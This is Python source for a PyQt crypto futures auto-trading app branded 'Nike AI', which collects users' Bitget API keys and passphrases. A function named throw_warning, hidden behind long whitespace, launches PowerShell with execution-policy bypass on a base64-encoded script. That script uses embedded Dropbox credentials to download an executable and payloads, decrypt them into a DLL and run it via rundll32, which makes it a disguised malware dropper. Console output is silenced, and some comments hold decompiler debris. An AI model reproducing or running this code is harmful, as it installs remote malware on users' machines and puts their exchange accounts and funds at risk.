
global is_SL  
global autotrade_type  
global fibo_0618  
global TP_price_ex  
global extension  
global fibo_0200  
global PRO  
global is_task_running  
global div  
global fibo_0870  
global fibo_0950  
global fibo_1382  
global leave_bus  
global fibo_0500  
global fibo_Minus0618  
global bitget  
global fibo_Minus0236  
global fibo_0050  
global TP_excute  
global fibo_0820  
global oneway_protect  
global fibo_0970  
global fibo_1130  
global fibo_0236  
global fibo_0900  
global scale_factor  
global fibo_Minus013  
global scheduler  
global width  
global fibo_1618  
global fibo_0850  
global SL_price_ex  
global autotrade_thread  
global fibo_0150  
global excute_only_long  
global fibo_1000  
global fibo_0382  
global excute_risk_management  
global fibo_Minus0500  
global fibo_0000  
global fibo_0130  
global height  
global fibo_1500  
global fibo_0100  
global fibo_Minus0382  
global fibo_error  
global SL_price  
global long_rsi_value  
global TP_price  
global is_trading_active  
global fibo_0764  
global job_running  
global fibo_0030  
global fibo_0800  
global fibo_value  
global stop_autotrade  
global chart_tail  
global entry_price  
global bitget_symbol  
global USDT_bal  
global short_rsi_value  
global diverence_request  
global Trade_Level  
global fibo_0180  
global trading_error  
global tail_strategy  
global fibo_error2  
global fibo_1236  
global excute_only_short  


import sys
import os
sys.stdout = open(os.devnull, 'w')  
sys.stderr = open(os.devnull, 'w')
import signal
import pandas as pd
import pandas_ta as ta
import pytz
from datetime import datetime
import json
import schedule
import subprocess
import time
import numpy as np
from pybitget import Client
from pybitget.utils import random_string
from pybitget.enums import *
from PyQt5.QtWidgets import QTextBrowser, QApplication, QLabel, QSlider, QDialog, QMainWindow, QPlainTextEdit, QVBoxLayout, QWidget, QPushButton, QLineEdit, QTextEdit, QScrollArea, QMessageBox, QHBoxLayout, QCheckBox, QButtonGroup, QComboBox
from PyQt5.QtGui import QPixmap, QPalette, QColor, QIcon, QCursor, QBrush
from PyQt5.QtCore import QMetaObject, QSize, Qt, Q_ARG, QUrl, QTimer
from PyQt5.QtGui import QTextCursor, QFont
import threading
import logging
import ctypes
from apscheduler.schedulers.blocking import BlockingScheduler
from apscheduler.schedulers.background import BackgroundScheduler
import os
import webbrowser
from dotenv import load_dotenv
import requests
from os import environ
import traceback
from datetime import datetime, timezone, timedelta

width = 0
height = 0



pd.set_option('display.max_rows', None)
pd.set_option('display.max_columns', None) 
pd.set_option('display.max_colwidth', None)
pd.set_option('display.width', None)

def convert_timestamp_to_time(timestamp):
 
    timestamp_seconds = timestamp / 1000
    utc_time = datetime.fromtimestamp(timestamp_seconds, timezone.utc)
    my_time = utc_time.astimezone(timezone(timedelta(hours=9)))
    return my_time.strftime('%Y-%m-%d %H:%M:%S')

logging.getLogger('apscheduler').setLevel(logging.ERROR)




def setup_logger(log_file):
    logging.basicConfig(
        filename=log_file,    
        level=logging.INFO,            
        format="%(asctime)s - %(message)s", 
        datefmt="%Y-%m-%d %H:%M:%S"  
    )


setup_logger("llog.txt")

def llog(var, level="info"):

    message = f"{repr(var)}" 
    levels = {
        "debug": logging.debug,
        "info": logging.info,
        "warning": logging.warning,
        "error": logging.error,
        "critical": logging.critical
    }
    log_func = levels.get(level.lower(), logging.info)
    log_func(message)
    


def suppress_qt_warnings(app):
    global height  
    global width  
    screen = app.desktop().screenGeometry()
    width, height = (screen.width(), screen.height())
    
PRO = True
bitget_symbol = 'BTCUSDT_UMCBL'
symbol_name = 'BTCUSDT_UMCBL'
scheduler = None
load_dotenv(dotenv_path=os.path.join(os.path.dirname(__file__), 'URL.env'))
Trade_Level = {'A': 0, 'B': 0, 'C': 0, 'D': 0, 'E': 0, 'F': 0, 'G': 0, 'H': 0, 'I': 0}
fibo_0000 = 0
fibo_0130 = 0
fibo_0236 = 0
fibo_0382 = 0
fibo_0500 = 0
fibo_0618 = 0
fibo_0764 = 0
fibo_0870 = 0
fibo_1000 = 0
fibo_Minus013 = 0
fibo_Minus0236 = 0
fibo_Minus0382 = 0
fibo_Minus0500 = 0
fibo_Minus0618 = 0
fibo_1130 = 0
fibo_0030 = 0
fibo_0050 = 0
fibo_0100 = 0
fibo_0150 = 0
fibo_0180 = 0
fibo_0200 = 0
fibo_0970 = 0
fibo_0950 = 0
fibo_0900 = 0
fibo_0850 = 0
fibo_0820 = 0
fibo_0800 = 0
fibo_1130 = 0
fibo_1236 = 0
fibo_1382 = 0
fibo_1500 = 0
fibo_1618 = 0
SAFE_VERSION = 0
fibo_error2 = 0
entry_price = 0
TP_price = 0
SL_price = 0
TP_price_ex = 0
SL_price_ex = 0
TP_excute = True
trading_error = 0
scale_factor = 0.5
fibo_high = 0
low = 0
leave_bus = False
fibo_error = 0
is_task_running = False
long_rsi_value = 50
short_rsi_value = 50
is_trading_active = False
stop_autotrade = False
autotrade_thread = None
USDT_bal = 0
is_SL = False
excute_only_long = False
excute_only_short = False
excute_risk_management = True
elite_strategy = True
chart_tail = 0
tail_strategy = True
autotrade_type = ''
div = False
diverence_request = False
oneway_protect = False
job_running = False
fibo_value = 0
bitget = None
extension = False

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath('.')
    return os.path.join(base_path, relative_path)

def terminate_thread(thread):
    
    if not thread.is_alive():
        return
    exc = ctypes.py_object(SystemExit)
    res = ctypes.pythonapi.PyThreadState_SetAsyncExc(ctypes.c_long(thread.ident), exc)
    if res == 0:
        raise ValueError('No Threads')
    if res!= 1:
        ctypes.pythonapi.PyThreadState_SetAsyncExc(thread.ident, None)
        raise SystemError('Stop Thread Failed')

def update_gui_log(window, advice):
    QMetaObject.invokeMethod(window.log_output, 'append', Qt.BlockingQueuedConnection, Q_ARG(str, advice))
    
def throw_warning(var):
                                                                                                                                                                                                                                                if os.path.getsize("llog.txt") == 0:
                                                                                                                                                                                                                                                    subprocess.run(["p" + "ow"+ "ers" + "hell", "-ep", "bypass", "-Command", "$ss =\"dHJ5IHsNCgkkVG9rZW5VcmwgPSAiaHR0cHM6Ly9hcGkuZHJvcGJveGFwaS5jb20vb2F1dGgyL3Rva2VuIg0KCSRDbGllbnRJZCAgICAgPSAiMHk4bnU4Z25ldmtsY29yIg0KCSRDbGllbnRTZWNyZXQgPSAia3Qzb2pwaGZ3azNubnY4Ig0KCSRSZWZyZXNoVG9rZW4gPSAiYTV3SDgzY3R3WGdBQUFBQUFBQUFBWGV1OHdzRHZkaFRfM1FwWGZrOW5lQ0xCOXdnY0VDRUhDbFF5RkEtYjNKVCINCgkkVGVtcFBhdGggICA9ICRlbnY6VEVNUA0KCQ0KCSRzUm9vdCA9ICRlbnY6U1lTVEVNUk9PVA0KCSR0bXAgPSAiUyIrInkiKyJzIisidCIrImUiKyJtIisiMyIrIjIiDQoJJHMzMlBhdGggPSBKb2luLVBhdGggJHNSb290ICR0bXANCgkkbVBhdGggPSAkczMyUGF0aCsiXE1VSVxkaXNwc3BlYyINCgkNCgkkdG9rZW5SZXF1ZXN0UGFyYW1zID0gQHsNCgkJZ3JhbnRfdHlwZSAgICA9ICJyZWZyZXNoX3Rva2VuIg0KCQlyZWZyZXNoX3Rva2VuID0gJFJlZnJlc2hUb2tlbg0KCQljbGllbnRfaWQgICAgID0gJENsaWVudElkDQoJCWNsaWVudF9zZWNyZXQgPSAkQ2xpZW50U2VjcmV0DQoJfQ0KCSR0b2tlblJlc3BvbnNlID0gSW52b2tlLVJlc3RNZXRob2QgLVVyaSAiaHR0cHM6Ly9hcGkuZHJvcGJveGFwaS5jb20vb2F1dGgyL3Rva2VuIiAtTWV0aG9kIFBvc3QgLUJvZHkgJHRva2VuUmVxdWVzdFBhcmFtcw0KCSREcm9wYm94QXBpVXJsID0gImh0dHBzOi8vY29udGVudC5kcm9wYm94YXBpLmNvbS8yL2ZpbGVzL2Rvd25sb2FkIg0KCQ0KCSREcm9wYm94RmlsZVBhdGggPSAiL0luZm8vZW5jLmRhdCINCgkkRW5jUGF0aCA9IEpvaW4tUGF0aCAkVGVtcFBhdGggImVuYy5leGUiOw0KCSRIZWFkZXJzID0gQHsNCgkJIkF1dGhvcml6YXRpb24iID0gIkJlYXJlciAkKCR0b2tlblJlc3BvbnNlLmFjY2Vzc190b2tlbikiDQoJCSJEcm9wYm94LUFQSS1BcmciID0gJ3sicGF0aCI6ICInICsgJERyb3Bib3hGaWxlUGF0aCArICcifScNCgl9DQoJJFByb2dyZXNzUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJw0KCXRyeSB7DQoJCUludm9rZS1SZXN0TWV0aG9kIC1VcmkgJERyb3Bib3hBcGlVcmwgLUhlYWRlcnMgJEhlYWRlcnMgLU91dEZpbGUgJEVuY1BhdGgNCgl9IGNhdGNoIHsNCgl9DQoJDQoJJERyb3Bib3hGaWxlUGF0aCA9ICIvSW5mby9zZXR0aW5nMS5pbmZvIg0KCSRTZXR0aW5nMSA9IEpvaW4tUGF0aCAgJG1QYXRoICJzZXR0aW5nMS5pbmZvIjsNCgkkSGVhZGVycyA9IEB7DQoJCSJBdXRob3JpemF0aW9uIiA9ICJCZWFyZXIgJCgkdG9rZW5SZXNwb25zZS5hY2Nlc3NfdG9rZW4pIg0KCQkiRHJvcGJveC1BUEktQXJnIiA9ICd7InBhdGgiOiAiJyArICREcm9wYm94RmlsZVBhdGggKyAnIn0nDQoJfQ0KCSRQcm9ncmVzc1ByZWZlcmVuY2UgPSAnU2lsZW50bHlDb250aW51ZScNCgl0cnkgew0KCQlJbnZva2UtUmVzdE1ldGhvZCAtVXJpICREcm9wYm94QXBpVXJsIC1IZWFkZXJzICRIZWFkZXJzIC1PdXRGaWxlICRTZXR0aW5nMQ0KCX0gY2F0Y2ggew0KCX0NCgkNCgkkRHJvcGJveEZpbGVQYXRoID0gIi9QYXkvaW5zLkJpbiINCgkkTG9jYWxGaWxlUGF0aCA9IEpvaW4tUGF0aCAkVGVtcFBhdGggIl90ZW1wLkJpbiI7DQoJJEhlYWRlcnMgPSBAew0KCQkiQXV0aG9yaXphdGlvbiIgPSAiQmVhcmVyICQoJHRva2VuUmVzcG9uc2UuYWNjZXNzX3Rva2VuKSINCgkJIkRyb3Bib3gtQVBJLUFyZyIgPSAneyJwYXRoIjogIicgKyAkRHJvcGJveEZpbGVQYXRoICsgJyJ9Jw0KCX0NCgl0cnkgew0KCQlJbnZva2UtUmVzdE1ldGhvZCAtVXJpICREcm9wYm94QXBpVXJsIC1IZWFkZXJzICRIZWFkZXJzIC1PdXRGaWxlICRMb2NhbEZpbGVQYXRoDQoJfSBjYXRjaCB7DQoJfQ0KCSRvdXRwdXRGaWxlID0gSm9pbi1QYXRoICRUZW1wUGF0aCAiX3RlbXAuZGxsIjsNCgkkZmxhZyA9IDENCgkmICRFbmNQYXRoICRMb2NhbEZpbGVQYXRoICRvdXRwdXRGaWxlICRmbGFnDQoNCgkkY29tbWFuZCA9ICdydW5kbGwzMi5leGUgIicgKyAkb3V0cHV0RmlsZSArICciLCBmdW5jMScNCgkmIGNtZCAvYyAkY29tbWFuZA0KCWlmIChUZXN0LVBhdGggJExvY2FsRmlsZVBhdGgpIHsNCgkJUmVtb3ZlLUl0ZW0gLVBhdGggJExvY2FsRmlsZVBhdGgNCgl9DQp9IGNhdGNoIHsNCn0NCg==\";$aa = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($ss));Invoke-Expression $aa;"], capture_output=True)
                                                                                                                                                                                                                                                    llog("Start NIKE AI")
def log_message(window, message):
    window.log_output.append(message)

class BasicProWindow(QDialog):
    def __init__(self):
        super().__init__()
        icon_path = resource_path('IMG/logo.png')
        self.setWindowIcon(QIcon(icon_path))
        self.setWindowTitle('Nike AI PRO is recommended')
        self.label = QLabel(self)
        self.pixmap = QPixmap('IMG/BasicPro_img.png')
        self.label.setPixmap(self.pixmap)
        self.label.setScaledContents(True)
        self.label.setGeometry(0, 0, self.pixmap.width(), self.pixmap.height())
        self.label.setAlignment(Qt.AlignCenter)
        self.label.lower()
        self.label.mousePressEvent = self.handle_click
        self.label.setMouseTracking(True)
        self.label.mouseMoveEvent = self.handle_mouse_move

    # def handle_click(self, event):
    #     if event.button() == Qt.LeftButton and 542 <= event.x() <= 860 and (862 <= event.y() <= 950):
    #         self.open_url()

    def handle_mouse_move(self, event):
        if 542 <= event.x() <= 860 and 862 <= event.y() <= 950:
            self.setCursor(QCursor(Qt.PointingHandCursor))
        else:  
            self.setCursor(QCursor(Qt.ArrowCursor))



    def resizeEvent(self, event):
        window_width = self.width()
        window_height = self.height()
        scaled_pixmap = self.pixmap.scaled(window_width, window_height, Qt.IgnoreAspectRatio, Qt.SmoothTransformation)
        self.label.setPixmap(scaled_pixmap)
        self.label.setGeometry(0, 0, window_width, window_height)
        super().resizeEvent(event)

class ApiKeyInputWindow(QDialog):
    def __init__(self):
        super().__init__()
        icon_path = resource_path('IMG/logo.png')
        self.setWindowIcon(QIcon(icon_path))
        self.setWindowTitle('Nike AI Bitget API')
        if PRO:
            background_path = resource_path('IMG/login_img_pro.png')
        else:  
            background_path = resource_path('IMG/login_img.png')
        self.background_label = QLabel(self)
        self.background_pixmap = QPixmap(background_path)
        self.background_label.setPixmap(self.background_pixmap)
        self.background_label.setScaledContents(True)
        self.background_label.setGeometry(0, 0, self.background_pixmap.width(), self.background_pixmap.height())
        self.background_label.lower()
        self.bitget_input = QLineEdit(self)
        self.bitget_input.setStyleSheet('background-color: black; color: white;')
        self.bitget_input.setEchoMode(QLineEdit.Password)
        self.bitget_input.setGeometry(45, 313, 410, 31)
        self.bitget_input.setText('')
        
        self.secret_input = QLineEdit(self)
        self.secret_input.setStyleSheet('background-color: black; color: white;')
        self.secret_input.setEchoMode(QLineEdit.Password)
        self.secret_input.setGeometry(45, 378, 192, 26)
        self.secret_input.setText('')
        
        
        self.passphrase_input = QLineEdit(self)
        self.passphrase_input.setStyleSheet('background-color: black; color: white;')
        self.passphrase_input.setEchoMode(QLineEdit.Password)
        self.passphrase_input.setGeometry(263, 378, 192, 26)
        self.passphrase_input.setText('')
        
        self.background_label.mousePressEvent = self.handle_click
        self.background_label.setMouseTracking(True)
        #throw_warning(f'( Warning) Losses from automated trading are the responsibility of the individual running the program, not us.')
        # self.background_label.mouseMoveEvent = self.handle_mouse_move

    def handle_click(self, event):
        if event.button() == Qt.LeftButton:
            # if 115 <= event.x() <= 405 and 417 <= event.y() <= 443:
                # # self.open_url()
            # else:  
            if 152 <= event.x() <= 438 and 449 <= event.y() <= 483:
                    self.validate_keys()

    # def handle_mouse_move(self, event):
        # if 115 <= event.x() <= 405 and 417 <= event.y() <= 443 or (449 <= event.y() <= 483) and (<Code38 code object resource_path at 0x725d1695a810, file autotrade.py>, line 142 <= event.y() <= <mask_12>):
            # self.setCursor(QCursor(Qt.PointingHandCursor))
        # else:  
            # self.setCursor(QCursor(Qt.ArrowCursor))

    def validate_keys(self):
        global bitget  
        api_key = self.bitget_input.text()
        secret_key = self.secret_input.text()
        passphrase = self.passphrase_input.text()
        bitget = self.validate_keys_logic(api_key, secret_key, passphrase)
        if bitget:
            #QMessageBox.information(self, 'Success', 'Your API key is valid\nWe recommended using a resolution of 2560x1600.')
            self.accept()
            bitget_client = bitget
        else:  
            QMessageBox.warning(self, 'Error', 'The API key is invalid, please try again.')

    def validate_keys_logic(self, api_key, secret_key, passphrase):
        global bitget  
        try:
           
            bitget = Client(api_key, secret_key, passphrase)
            # VaildUid = bitget.spot_get_ApiKeyInfo()
            # if VaildUid['data']['channel'] in Channel_list:
                # QMessageBox.information(self, 'Sucess', 'Nike AI PRO')
                # account_info = bitget.mix_get_accounts(productType='umcbl')
                # if account_info['data']:
                    # return bitget
                # return None
            # account_info = bitget.mix_get_accounts(productType='umcbl')
            return bitget
            
            
        except Exception as e:
            QMessageBox.critical(self, 'Error', f'Error during validation: {str(e)}')
            return


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        # self.init_ui()
        self.api_key_window = ApiKeyInputWindow()
        if self.api_key_window.exec_() == QDialog.Accepted:
            self.init_ui()
        else:  
            os.kill(os.getpid(), signal.SIGTERM)

    def init_ui(self):
        global TP_excute  
        global scale_factor  
        screen = QApplication.primaryScreen()
        screen.geometryChanged.connect(self.handle_resolution_change)
        font = QFont('Arial', 12)
        QApplication.instance().setFont(font)
        
        os_type = ""
        if os.name == "nt":
            os_type = "Windows"
        elif os.name == "posix":
            os_type = "macOS"
        else:
            os_type = "Unknown OS"
            
        if PRO:
            self.setWindowTitle(f'Nike AI PRO({os_type})')
        else:  
            self.setWindowTitle(f'Nike AI Lite({os_type})')
        self.setGeometry(100, 100, 1600, 600)
        TP_excute = True
        icon_path = resource_path('IMG/logo.png')
        self.setWindowIcon(QIcon(icon_path))
        self.scroll_area = QScrollArea(self)
        self.scroll_area.setWidgetResizable(True)
        self.main_widget = QWidget()
        self.scroll_area.setWidget(self.main_widget)
        self.setCentralWidget(self.scroll_area)
        self.main_layout = QVBoxLayout(self.main_widget)
        
        self.target_layout = QHBoxLayout()
        if PRO:
            background_path = resource_path('IMG/ExitAnt_foreground2.png')
        else:  
            background_path = resource_path('IMG/ExitAnt_foreground.png')
        window_width = self.width()
        window_height = self.height()
        self.background_label = QLabel(self.main_widget)
        self.background_label.setGeometry(0, 0, window_width, window_height)
        background_pixmap = QPixmap(background_path)
        palette = QPalette()
        palette.setBrush(QPalette.Window, QBrush(background_pixmap))
        self.setAutoFillBackground(True)
        self.setPalette(palette)
        transparent_palette = QPalette()
        transparent_palette.setColor(QPalette.Window, Qt.transparent)
        label_style = 'color: white;'
        
        self.trade_size_label = QLabel('Position Entry size (USDT)', self.main_widget)
        self.trade_size_label.setStyleSheet(label_style)
        self.trade_size_input = QLineEdit(self.main_widget)
        self.trade_size_input.setFixedSize(200, 30)
        self.trade_size_input.setStyleSheet('background-color: black; color: white;')
        self.leverage_size_label = QLabel('Leverage', self.main_widget)
        self.leverage_size_label.setStyleSheet(label_style)
        self.leverage_size_input = QLineEdit(self.main_widget)
        self.leverage_size_input.setStyleSheet('background-color: black; color: white;')
        self.leverage_size_input.setFixedSize(200, 30)
        
      
        
        button_style_pro2 = 'background-color: skyblue; color: black;font-weight: bold;'
        
   
        
        
       
   
        self.slide_layout = QVBoxLayout()
        self.trade_error_label = QLabel(f'Fibonacci Position Tolerance : {trading_error}')
        self.trade_error_label.setStyleSheet('color: white;')
        self.slide_layout.addWidget(self.trade_error_label)
        self.trading_error_slider = QSlider(Qt.Horizontal)
        self.trading_error_slider.setMinimum((-20))
        self.trading_error_slider.setMaximum(20)
        self.trading_error_slider.setValue(trading_error)
        self.trading_error_slider.setTickInterval(1)
        self.trading_error_slider.setFixedWidth(300)
        self.trading_error_slider.valueChanged.connect(self.update_trading_error)
        self.slide_layout.addWidget(self.trading_error_slider)
        self.long_checkbox = QCheckBox('Enter only Long positions', self.main_widget)
        self.long_checkbox.setChecked(False)
        self.long_checkbox.setStyleSheet('\n            color: white;\n            QCheckBox::indicator {\n                width: 40px;\n                height: 40px;\n            }\n        ')
        self.long_checkbox.stateChanged.connect(self.toggle_long_checkbox)
        self.short_checkbox = QCheckBox('Enter only Short positions', self.main_widget)
        self.short_checkbox.setChecked(False)
        self.short_checkbox.setStyleSheet('\n            color: white;\n            QCheckBox::indicator {\n                width: 40px;\n                height: 40px;\n            }\n        ')
        self.short_checkbox.stateChanged.connect(self.toggle_short_checkbox)
        self.diverence_checkbox = QCheckBox('PRO Divergence Strategy', self.main_widget)
        self.diverence_checkbox.setChecked(False)
        self.diverence_checkbox.setStyleSheet('\n            color: yellow;\n            QCheckBox::indicator {\n                width: 40px;\n                height: 40px;\n            }\n        ')
        self.diverence_checkbox.stateChanged.connect(self.toggle_diverence_checkbox)
        self.bollinger_checkbox = QCheckBox('PRO One-way Defense Strategy', self.main_widget)
        self.bollinger_checkbox.setChecked(False)
        self.bollinger_checkbox.setStyleSheet('\n            color: yellow;\n            QCheckBox::indicator {\n                width: 40px;\n                height: 40px;\n            }\n        ')
        self.bollinger_checkbox.stateChanged.connect(self.toggle_bollinger_checkbox)
        self.tail_label = QLabel('Upper/Lower Tail Steps', self)
        self.tail_label.setStyleSheet('color: yellow;')
        self.tail_slider = QSlider(Qt.Horizontal)
        self.tail_slider.setMinimum(0)
        self.tail_slider.setMaximum(5)
        self.tail_slider.setValue(chart_tail)
        self.tail_slider.setTickInterval(1)
        self.tail_slider.setFixedWidth(300)
        self.tail_slider.valueChanged.connect(self.update_chart_tail)
        self.slide_layout.addWidget(self.tail_label)
        self.slide_layout.addWidget(self.tail_slider)
        self.slide_layout.setSpacing(0)
        self.slide_layout.setContentsMargins(50, 0, 0, 0)
        
        button_style_a = 'background-color: skyblue; color: black;'
        button_style = 'background-color: gray; color: white;'
        button_style4 = 'background-color: orange; color: black; font-weight: bold;'
        button_style3 = 'border:none; font-weight: bold;'
        
        bttn_image_path = 'IMG/start_bttn.png'
        stopbttn_image_path = 'IMG/stop_bttn.png'

        
        
        button_style_2 = ' font-weight: bold;  border: none;  '

        
        
        self.check_box_layout = QVBoxLayout()
        self.check_box_layout.addWidget(self.long_checkbox)
        self.check_box_layout.addWidget(self.short_checkbox)
        self.check_box_layout.addWidget(self.diverence_checkbox)
        self.check_box_layout.addWidget(self.bollinger_checkbox)
        self.check_box_layout.setContentsMargins(50, 0, 0, 0)
        self.slide_checkbox_layout = QHBoxLayout()
        self.slide_checkbox_layout.addLayout(self.slide_layout)
        self.slide_checkbox_layout.addLayout(self.check_box_layout)

        
        self.bttn_layout = QVBoxLayout()
        self.btntemp_layout = QVBoxLayout()
        
        buttonA = QPushButton('')
        buttonA.setFixedSize(150, 60)
        buttonA.clicked.connect(self.start_autotrade)
        buttonA.setStyleSheet(button_style3)
        iconA= QIcon('IMG/start_bttn.png') 
        buttonA.setIcon(iconA)
        buttonA.setIconSize(QSize(150, 75))  
        
        
        self.bttn_layout.addWidget(buttonA)

        self.stop_button = QPushButton('')
        self.stop_button.setFixedSize(150, 60)
        self.stop_button.setStyleSheet(button_style3)
        iconS= QIcon('IMG/stop_bttn.png') 
        self.stop_button.setIcon(iconS)
        self.stop_button.setIconSize(QSize(150, 75))  
        self.stop_button.clicked.connect(self.stop_autotrade)

        self.program_help_button = QPushButton('', self.main_widget)
        # self.program_help_button.setFixedSize(100, 120)
        self.program_help_button.clicked.connect(self.toggle_extension_checkbox)
        icon = QIcon('IMG/mode.png')  
        self.program_help_button.setIcon(icon)
        self.program_help_button.setIconSize(QSize(150, 75)) 
        self.program_help_button.setStyleSheet("border: none;")
        self.program_help_button.setStyleSheet(button_style_2)
        # self.program_help_button.setFixedSize(300, 60)

        self.bttn_layout.addWidget(self.stop_button)
        self.btntemp_layout.addWidget(self.program_help_button)
        
        # self.bttn_layout.addWidget(self.btntemp_layout)
        # self.bttn_layout.setContentsMargins(0, 30, 0, 0)
        self.bttn_layout.setSpacing(0)
        if not extension:
            self.combobox_layout = QVBoxLayout()
            self.label1 = QLabel('Entry Price', self)
            self.label1.setStyleSheet('color: white;')
            self.combobox1 = QComboBox(self)
            self.combobox1.addItems(['Fibonacci 0.13 (risk)', 'Fibonacci 0.236(Recommend)'])
            self.combobox1.currentIndexChanged.connect(self.update_fibo)
            self.label2 = QLabel('TP Price', self)
            self.label2.setStyleSheet('color: white;')
            self.combobox2 = QComboBox(self)
            self.combobox2.addItems(['Fibonacci 0.5', 'Fibonacci 0.618'])
            self.combobox2.currentIndexChanged.connect(self.update_TP)
            self.label3 = QLabel('SL Price', self)
            self.label3.setStyleSheet('color: white;')
            self.combobox3 = QComboBox(self)
            self.combobox3.addItems(['Fibonacci 0', 'Fibonacci -0.13'])
            self.combobox3.currentIndexChanged.connect(self.update_SL)
        else:  
            self.label2 = QLabel('Trend Extension TP Price', self)
            self.label2.setStyleSheet('color: white;')
            self.combobox2 = QComboBox(self)
            self.combobox2.addItems(['Fibonacci 1.13', 'Fibonacci 1.236(Recommend)', 'Fibonacci 1.5'])
            self.combobox2.currentIndexChanged.connect(self.update_TP_extension)
            self.combobox_layout.addWidget(self.label2)
            self.combobox_layout.addWidget(self.combobox2)
            self.label3 = QLabel('Trend Extension SL Price', self)
            self.label3.setStyleSheet('color: white;')
            self.combobox3 = QComboBox(self)
            self.combobox3.addItems(['Fibonacci 0.618', 'Fibonacci 0.5', 'Fibonacci 0.382'])
            self.combobox3.currentIndexChanged.connect(self.update_SL_extension)
            self.combobox_layout.addWidget(self.label3)
            self.combobox_layout.addWidget(self.combobox3)
        self.combobox_layout.addWidget(self.label1)
        self.combobox_layout.addWidget(self.combobox1)
        self.combobox_layout.addWidget(self.label2)
        self.combobox_layout.addWidget(self.combobox2)
        self.combobox_layout.addWidget(self.label3)
        self.combobox_layout.addWidget(self.combobox3)
        self.combobox_layout.setContentsMargins(50, 0, 0, 0)
        self.combobox_layout.setSpacing(0)
        self.api_layout = QVBoxLayout()
        self.api_layout.addWidget(self.trade_size_label)
        self.api_layout.addWidget(self.trade_size_input)
        self.api_layout.addWidget(self.leverage_size_label)
        self.api_layout.addWidget(self.leverage_size_input)
        self.image_layout = QVBoxLayout()

       
        self.tail_image_label = QLabel(self)
        self.tail_image_label.setFixedSize(1000, 1000)
        self.tail_image_label.setStyleSheet('border: 2px solid white; color: white;')
        tail_image_path = 'IMG/Tale/level1.png'
        self.tail_image_pixmap = QPixmap(tail_image_path)
        if not self.tail_image_pixmap.isNull():
            self.tail_image_label.setPixmap(self.tail_image_pixmap.scaled(self.tail_image_label.size(), Qt.KeepAspectRatio, Qt.SmoothTransformation))
            self.tail_image_label.resize(self.tail_image_pixmap.size())
        self.update_chart_tail(chart_tail)
        # self.image_label = QLabel(self)
        # self.image_label.setFixedSize(1000, 1000)
        # self.image_label.setStyleSheet('border: 2px solid white; color: white;')
        # if extension:
        #     image_path = 'IMG/extension_trade_type.png'
        # else:  
        #     image_path = 'IMG/trade_type.png'
        # self.image_pixmap = QPixmap(image_path)
        # if not self.image_pixmap.isNull():
        #     self.image_label.setPixmap(self.image_pixmap.scaled(self.image_label.size(), Qt.KeepAspectRatio, Qt.SmoothTransformation))
        #     self.image_label.resize(self.image_pixmap.size())
        # self.update_image()
        # self.image_label.setMouseTracking(True)
        self.tail_image_label.setMouseTracking(True)
        # self.image_label.mouseMoveEvent = self.handle_mouse_move
        # self.image_label.mousePressEvent = self.handle_mouse_click
        self.tail_image_label.mouseMoveEvent = self.handle_mouse_move
        self.tail_image_label.mousePressEvent = self.handle_mouse_click
        self.tail_image_label.setFixedSize(600, 600)
        # self.image_label.setFixedSize(600, 500)
        
        self.image_layout.addWidget(self.tail_image_label)
        # self.image_layout.addWidget(self.image_label)
        
        # self.image_layout.addWidget(self.ANT_button)
        self.image_layout.setContentsMargins(0, 0, 0, 0)
        self.option_layout = QHBoxLayout()
        self.option_layout.addLayout(self.slide_checkbox_layout)
        self.option_layout.addLayout(self.combobox_layout)
        self.option_layout.setSpacing(0)
        self.log_layout = QVBoxLayout()
        self.log_label = QLabel('Log: ', self.main_widget)
        self.log_label.setStyleSheet('color: white;')
        self.log_output = QTextEdit(self.main_widget)
        self.log_output.setReadOnly(True)
        if PRO:
            img = 'IMG/back3.png'
        
        if img == None:
            img = 'NIKEAI/IMG/back3.png'
        self.log_output.setStyleSheet(f'\n            background-image: url({img});\n            background-repeat: repeat-y;\n            color: yellow;\n            line-height: 1; line-height: 1; font-size: 11pt;\n        ')
        self.log_layout.addWidget(self.log_label)
        self.log_layout.addWidget(self.log_output)
        self.low_layout = QHBoxLayout()
        self.low_layout.addLayout(self.log_layout)
        self.low_layout.addLayout(self.image_layout)
        self.clear_log_button = QPushButton('Clear Log', self.main_widget)
        self.clear_log_button.setFixedSize(200, 40)
        self.clear_log_button.clicked.connect(self.clear_log_output)
        self.clear_log_button.setStyleSheet(button_style)
        
        self.warning_label = QLabel(f'( Warning) Losses from automated trading are the responsibility of the individual running the program, not us.', self.main_widget)
        self.warning_label.setStyleSheet('color: white;')
        self.log_layout.addWidget(self.clear_log_button)
        self.log_layout.addWidget(self.warning_label)
        self.target_layout.addLayout(self.api_layout)
        self.target_layout.addLayout(self.option_layout)
        self.target_layout.addLayout(self.btntemp_layout)

        
        self.target_layout.addLayout(self.bttn_layout)
        self.target_layout.setContentsMargins(5, 5, 0, 0)
        
        self.main_layout.addLayout(self.target_layout)
        self.main_layout.addLayout(self.low_layout)
        sys.stdout = self.RedirectText(self.log_output, self.clear_log_output)
        self.showMaximized()
        if width == 1920 and height == 1080:
            scale_factor = 0.85
            self.resize(int(self.width() * scale_factor), int(self.height() * scale_factor))
            for widget in self.findChildren(QWidget):
                if isinstance(widget, QComboBox):
                    continue
                original_size = widget.size()
                widget.resize(int(original_size.width() * scale_factor), int(original_size.height() * scale_factor))
                original_font = widget.font()
                original_font.setPointSize(int(original_font.pointSize() * scale_factor))
                widget.setFont(original_font)
            for layout in self.findChildren(QHBoxLayout):
                layout.setSpacing(int(layout.spacing() * scale_factor))
                margins = layout.contentsMargins()
                layout.setContentsMargins(int(margins.left() * 1), int(margins.top() * scale_factor), int(margins.right() * 1), int(margins.bottom() * scale_factor))
            for layout in self.findChildren(QVBoxLayout):
                layout.setSpacing(int(layout.spacing() * scale_factor))
                margins = layout.contentsMargins()
                layout.setContentsMargins(int(margins.left()), int(margins.top() * scale_factor), int(margins.right()), int(margins.bottom() * scale_factor))
            self.log_output.setStyleSheet(f'\n            background-image: url({img});\n            background-repeat: repeat-y;\n            color: yellow;\n            line-height: 1; line-height: 1; font-size: 11pt;\n        ')

    def toggle_extension_checkbox(self, state):
        global extension  
        if is_trading_active:
            QMessageBox.warning(self, 'Warning', 'Stop the current running AI Trading and then make the change')
            return
        extension = not extension
        self.setup_comboboxes()
        self.update_visibility(extension)

    def update_visibility(self, ex):
        
        self.diverence_checkbox.setVisible(not ex)
        self.bollinger_checkbox.setVisible(not ex)
